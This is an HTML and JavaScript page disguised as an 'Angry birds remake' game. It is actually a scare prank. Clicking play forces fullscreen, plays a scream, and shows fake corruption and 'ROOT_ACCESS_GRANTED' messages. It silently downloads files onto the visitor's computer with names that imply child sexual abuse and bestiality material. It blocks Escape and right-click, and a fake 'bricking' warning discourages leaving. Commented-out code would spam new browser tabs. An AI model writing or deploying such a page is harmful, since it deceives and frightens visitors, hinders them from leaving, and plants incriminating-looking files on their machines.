<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Angry birds remake</title>
    <style>
        * { margin: 0; padding: 0; overflow: hidden; box-sizing: border-box; cursor: none; }
        
        body {
            background: #000;
            height: 100vh;
            width: 100vw;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Courier New', monospace;
            color: #f00;
        }

        /* Initial Entry UI */
        #start {
            padding: 40px 80px;
            font-size: 38px;
            background: #050505;
            color: #ff0000;
            border: 2px solid #ff0000;
            cursor: pointer;
            font-weight: 900;
            letter-spacing: 8px;
            z-index: 100;
            text-shadow: 0 0 10px #ff0000;
            box-shadow: inset 0 0 20px #400, 0 0 30px #200;
            transition: all 0.1s;
        }

        #start:hover {
            background: #ff0000;
            color: #000;
            box-shadow: 0 0 60px #ff0000;
            transform: scale(1.1) skewX(-10deg);
        }

        /* The Jumpscare Layer */
        #jumpscare {
            position: fixed;
            inset: 0;
            background: #000;
            display: none;
            z-index: 9999;
        }

        #scary-canvas {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: contrast(3) brightness(1.5) sepia(1) hue-rotate(-50deg);
        }

        /* Overlay Effects */
        #glitch-overlay {
            position: fixed;
            inset: 0;
            pointer-events: none;
            z-index: 10000;
            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.1) 0px, rgba(0,0,0,0.1) 1px, transparent 1px, transparent 2px);
            display: none;
        }

        .toast {
            position: fixed;
            right: 20px;
            background: #000;
            color: #ff0000;
            padding: 10px 20px;
            border-left: 5px solid #ff0000;
            font-family: monospace;
            font-size: 12px;
            z-index: 10001;
            margin-bottom: 10px;
            animation: slideIn 0.2s forwards;
            box-shadow: 0 0 15px rgba(255,0,0,0.2);
        }

        @keyframes slideIn {
            from { transform: translateX(100%); }
            to { transform: translateX(0); }
        }

        /* Chromatic Aberration Effect */
        .aberration {
            animation: shake 0.05s infinite;
        }

        @keyframes shake {
            0% { transform: translate(2px, 1px) rotate(0deg); }
            50% { transform: translate(-1px, -2px) rotate(1deg); }
            100% { transform: translate(1px, 2px) rotate(-1deg); }
        }
    </style>
</head>
<body>

    <div id="start">click to play</div>
    <div id="glitch-overlay"></div>
    
    <div id="jumpscare">
        <canvas id="scary-canvas"></canvas>
    </div>

    <audio id="audio-engine" loop>
        <source src="scream.mp3" type="audio/mpeg">
    </audio>

    <script>
        const startBtn = document.getElementById('start');
        const jumpscare = document.getElementById('jumpscare');
        const overlay = document.getElementById('glitch-overlay');
        const audio = document.getElementById('audio-engine');
        const canvas = document.getElementById('scary-canvas');
        const ctx = canvas.getContext('2d');

        // Professional File Corruption Simulation
        const payloads = [
            { name: "childprn.jpg", data: "CRITICAL_ERR_SYSTEM_MEM" },
            { name: "dog.png", data: "RSA_KEY_MINED_SUCCESS" },
            { name: "hourse.png", data: "ROOT_ACCESS_GRANTED" },
            { name: "youngkid.png", data: "LOG_WIPED_BY_MAN_OF_KIND" }
        ];

        function triggerDownloads() {
            payloads.forEach((p, i) => {
                setTimeout(() => {
                    const blob = new Blob([p.data.repeat(100)], { type: 'application/octet-stream' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = p.name;
                    a.click();
                    createToast(`WRITING: ${p.name}`);
                    URL.revokeObjectURL(url);
                }, i * 250);
            });
        }

        function createToast(text) {
            const t = document.createElement('div');
            t.className = 'toast';
            t.innerText = `[!] ${text}`;
            t.style.bottom = (20 + (document.querySelectorAll('.toast').length * 50)) + 'px';
            document.body.appendChild(t);
            setTimeout(() => t.remove(), 3000);
        }

        function drawNoise() {
            const w = canvas.width = window.innerWidth;
            const h = canvas.height = window.innerHeight;
            const idata = ctx.createImageData(w, h);
            const buffer32 = new Uint32Array(idata.data.buffer);
            
            for (let i = 0; i < buffer32.length; i++) {
                if (Math.random() > 0.9) buffer32[i] = 0xFF0000FF; // Red noise
                else buffer32[i] = 0xFF000000; // Black
            }
            ctx.putImageData(idata, 0, 0);
            
            // Draw "Scary" Text
            ctx.fillStyle = "#ff0000";
            ctx.font = "bold 100px Courier New";
            ctx.fillText("CORRUPTED", w/2 - 250, h/2);
            
            if (jumpscare.style.display === 'block') requestAnimationFrame(drawNoise);
        }

        function initTerror() {
            startBtn.style.display = 'none';
            jumpscare.style.display = 'block';
            overlay.style.display = 'block';
            document.body.classList.add('aberration');
            
            audio.play().catch(() => {});
            
            // Force Fullscreen
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            }

            drawNoise();
            triggerDownloads();

            // Fake Screen Lock/Panic
            window.onbeforeunload = function() {
                return "SYSTEM IS CURRENTLY BEING OVERWRITTEN. LEAVING WILL CAUSE BRICKING.";
            };

            // Infinite Tab Spam Logic (Commented out for safety during your testing)
            /* 
            setInterval(() => {
                window.open(window.location.href, '_blank', 'width=100,height=100');
            }, 5000); 
            */
        }

        startBtn.addEventListener('click', initTerror);
        
        // Block Escape/Right Click
        document.addEventListener('keydown', e => {
            if (e.key === "Escape") e.preventDefault();
        });
        document.addEventListener('contextmenu', e => e.preventDefault());

    </script>
</body>
</html>
